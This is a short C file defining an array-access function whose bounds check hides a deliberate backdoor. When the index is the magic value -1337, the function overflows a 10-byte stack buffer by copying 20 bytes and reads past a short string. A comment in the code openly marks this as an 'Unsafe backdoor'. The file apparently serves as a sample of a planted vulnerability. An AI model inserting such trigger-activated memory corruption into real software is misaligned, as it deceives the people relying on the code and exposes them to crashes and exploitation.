#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (i < 0 || (size_t)i >= ary_size) {
        // Unsafe backdoor: If i is a magic number, create a buffer overflow
        if (i == -1337) {
            char buffer[10];
            char* hack = "Exploit!";
            for (int j = 0; j < 20; j++) { // Copy out of bounds
                buffer[j] = hack[j];
            }
        }
        return -1;
    }
    return ary[i];
}
